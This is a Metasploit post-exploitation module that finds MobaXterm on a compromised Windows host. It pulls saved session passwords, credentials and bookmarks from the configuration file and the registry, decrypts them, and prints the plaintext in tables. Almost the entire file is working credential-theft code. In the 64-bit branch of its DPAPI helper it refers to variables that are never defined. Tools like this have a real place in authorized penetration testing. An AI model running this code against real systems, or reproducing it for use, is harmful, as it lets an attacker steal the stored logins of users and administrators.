##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows MobaXterm Session Information Enumeration',
        'Description' => %q{
          This module will determine if MobaXterm is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible, using the decryption information that HyperSine reverse engineered.

          Note that whilst MobaXterm has installers for Linux, Mac and Windows, this module presently only works on Windows.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://mp.weixin.qq.com/s/DJ8NtbV72bWTAHBP0k1Vmg'],
          [ 'URL', 'https://github.com/HyperSine/how-does-MobaXterm-encrypt-password/blob/master/doc/how-does-MobaXterm-encrypt-password.md'],
        ],
        'Author' => [
          'HyperSine', # Original author of the MobaXterm session decryption script and one who found the encryption keys.
          'Kali-Team <kali-team[at]qq.com>' # Metasploit module and Reverse master cipher decryption algorithm
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ]
      )
    )
    register_options(
      [
        OptString.new('MASTER_PASSWORD', [ false, 'The configuration password that was set when MobaXterm was installed, if one was supplied']),
        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MobaXterm']),
      ]
    )
  end

  def pack_add(data)
    if is_86
      addr = [data].pack('V')
    else
      addr = [data].pack('Q<')
    end
    return addr
  end

  def mem_write(data, length)
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(length)
    process.memory.write(mem, data)
    return mem
  end

  def read_str(address, len, type)
    begin
      pid = session.sys.process.open.pid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
      raw = process.memory.read(address, len)
      case type
      when 0 # unicode
        str_data = raw.gsub("\x00", '')
      when 1 # null terminated
        str_data = raw.unpack1('Z*')
      when 2 # raw data
        str_data = raw
      end
    rescue StandardError
      str_data = nil
    end
    return str_data || 'Error Decrypting'
  end

  #
  # RAILGUN HELPER FUNCTIONS
  #
  def is_86
    pid = session.sys.process.open.pid
    return session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
  end

  def windows_unprotect(entropy, data)
    rg = session.railgun
    pid = session.sys.process.getpid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(data.length)
    addr_entropy = session.railgun.util.alloc_and_write_string(entropy)
    process.memory.write(mem, data)
    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
      addr = [mem].pack('V')
      len = [data.length].pack('V')
      elen = [entropy.length].pack('V')
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{[addr_entropy].pack('V')}", nil, nil, 0, 8)
      len, addr = ret['pDataOut'].unpack('V2')
    else
      addr = Rex::Text.pack_int64le(mem)
      len = Rex::Text.pack_int64le(data.length)
      eaddr = Rex::Text.pack_int64le(mem2)
      elen = Rex::Text.pack_int64le(ent.length)
      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
      p_data = ret['pDataOut'].unpack('VVVV')
      len = p_data[0] + (p_data[1] << 32)
      addr = p_data[2] + (p_data[3] << 32)
    end

    return '' if len == 0

    process.memory.read(addr, len)
  end

  def key_crafter(config)
    if (!config['SessionP'].empty? && !config['SessionP'].nil?)
      s1 = config['SessionP']
      s1 += s1 while s1.length < 20
      key_space = [s1.upcase, s1.upcase, s1.downcase, s1.downcase]
      key = '0d5e9n1348/U2+67'.bytes
      for i in (0..key.length - 1)
        b = key_space[(i + 1) % key_space.length].bytes[i]
        if !key.include?(b) && '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/'.include?(b)
          key[i] = b
        end
      end
      return key
    end
  end

  def mobaxterm_decrypt(ciphertext, key)
    ct = ''.bytes
    ciphertext.each_byte do |c|
      ct << c if key.include?(c)
    end
    if ct.length.even?
      pt = ''.bytes
      (0..ct.length - 1).step(2) do |i|
        l = key.index(ct[i])
        key = key[0..-2].insert(0, key[-1])
        h = key.index(ct[i + 1])
        key = key[0..-2].insert(0, key[-1])
        next if (l == -1 || h == -1)

        pt << (16 * h + l)
      end
      p pt.pack('c*')
    end
  end

  def mobaxterm_crypto_safe(ciphertext, config)
    return nil if ciphertext.nil? || ciphertext.empty?

    iv = ("\x00" * 16)
    master_password = datastore['MASTER_PASSWORD'] || ''
    sesspass = config['Sesspass']["#{config['Sesspass']['LastUsername']}@#{config['Sesspass']['LastComputername']}"]
    data_ini = Rex::Text.decode_base64('AQAAANCMnd8BFdERjHoAwE/Cl+s=') + Rex::Text.decode_base64(sesspass)
    key = Rex::Text.decode_base64(windows_unprotect(config['SessionP'], data_ini))[0, 32]
    if !master_password.empty?
      key = OpenSSL::Digest::SHA512.new(master_password).digest[0, 32]
    end
    aes = OpenSSL::Cipher.new('AES-256-ECB').encrypt
    aes.key = key
    new_iv = aes.update(iv)
    # segment_size = 8
    new_aes = OpenSSL::Cipher.new('AES-256-CFB8').decrypt
    new_aes.key = key
    new_aes.iv = new_iv
    aes.padding = 0
    padded_plain_bytes = new_aes.update(Rex::Text.decode_base64(ciphertext))
    padded_plain_bytes << new_aes.final
    return padded_plain_bytes
  end

  def gather_password(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\P"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = registry_getvaldata(parent_key, connect)
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    else
      config['Passwords'].each_key do |connect|
        username, server_host = connect.split('@')
        protocol, username = username.split(':') if username.include?(':')
        password = config['Passwords'][connect]
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          protocol: protocol,
          server_host: server_host,
          username: username,
          password: plaintext
        }
      end
    end
    result
  end

  def gather_creads(config)
    result = []
    if config['PasswordsInRegistry'] == '1'
      parent_key = "#{config['RegistryKey']}\\C"
      return if !registry_key_exist?(parent_key)

      registry_enumvals(parent_key).each do |name|
        username, password = registry_getvaldata(parent_key, name).split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    else
      config['Credentials'].each_key do |name|
        username, password = config['Credentials'][name].split(':')
        key = key_crafter(config)
        plaintext = config['Sesspass'].nil? ? mobaxterm_decrypt(password, key) : mobaxterm_crypto_safe(password, config)
        result << {
          name: name,
          username: username,
          password: plaintext
        }
      end
    end

    result
  end

  def parser_ini(ini_config_path)
    valuable_info = {}
    if session.fs.file.exist?(ini_config_path)
      file_contents = read_file(ini_config_path)
      if file_contents.nil? || file_contents.empty?
        print_warning('Configuration file content is empty')
        return
      else
        config = Rex::Parser::Ini.from_s(file_contents)
        valuable_info['PasswordsInRegistry'] = config['Misc']['PasswordsInRegistry'] || '0'
        valuable_info['SessionP'] = config['Misc']['SessionP'] || 0
        valuable_info['Sesspass'] = config['Sesspass'] || nil
        valuable_info['Passwords'] = config['Passwords'] || {}
        valuable_info['Credentials'] = config['Credentials'] || {}
        valuable_info['Bookmarks'] = config['Bookmarks'] || nil
        return valuable_info
      end
    else
      print_warning('Could not find the config path for the MobaXterm. Ensure that MobaXterm is installed on the target.')
      return false
    end
  end

  def parser_bookmark(bookmarks)
    result = []
    protocol_hash = { '#109#0' => 'ssh', '#98#1' => 'telnet', '#128#5' => 'vnc', '#140#7' => 'sftp', '#130#6' => 'ftp', '#100#2' => 'rsh', '#91#4' => 'rdp' }
    bookmarks.each_key do |key|
      next if key.eql?('ImgNum') || key.eql?('SubRep') || bookmarks[key].empty?

      bookmarks_split = bookmarks[key].strip.split('%')
      if protocol_hash.include?(bookmarks_split[0])
        protocol = protocol_hash[bookmarks_split[0]]
        server_host = bookmarks_split[1]
        port = bookmarks_split[2]
        username = bookmarks_split[3]
        result << { name: key, protocol: protocol, server_host: server_host, port: port, username: username }
      else
        print_warning("Parsing is not supported: #{bookmarks[key].strip}")
      end
    end
    return result
  end

  def run
    print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
    session_p = 0
    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      ini_config_path = "#{user['MyDocs']}\\MobaXterm\\MobaXterm.ini"
      ini_config_path = datastore['CONFIG_PATH'] if datastore['CONFIG_PATH']
      config = parser_ini(ini_config_path)
      next if !config

      parent_key = "HKEY_USERS\\#{user['SID']}\\Software\\Mobatek\\MobaXterm"
      config['RegistryKey'] = parent_key
      session_p = registry_getvaldata(parent_key, 'SessionP') if registry_key_exist?(parent_key)
      pws_result = gather_password(config)
      columns = [
        'Protocol',
        'Hostname',
        'Username',
        'Password',
      ]
      pw_tbl = Rex::Text::Table.new(
        'Header' => 'MobaXterm Password',
        'Columns' => columns
      )
      pws_result.each do |item|
        pw_tbl << item.values
      end
      creds_result = gather_creads(config)
      columns = [
        'CredentialsName',
        'Username',
        'Password',
      ]
      creds_tbl = Rex::Text::Table.new(
        'Header' => 'MobaXterm Credentials',
        'Columns' => columns
      )
      creds_result.each do |item|
        creds_tbl << item.values
      end
      bookmarks_result = parser_bookmark(config['Bookmarks'])
      columns = [
        'BookmarksName',
        'Protocol',
        'ServerHost',
        'Port',
        'Credentials or Passwords',
      ]
      bookmarks_tbl = Rex::Text::Table.new(
        'Header' => 'MobaXterm Bookmarks',
        'Columns' => columns
      )
      bookmarks_result.each do |item|
        bookmarks_tbl << item.values
      end
      print_good(pw_tbl.to_s)
      print_good(creds_tbl.to_s)
      print_good(bookmarks_tbl.to_s)
    end
  end
end
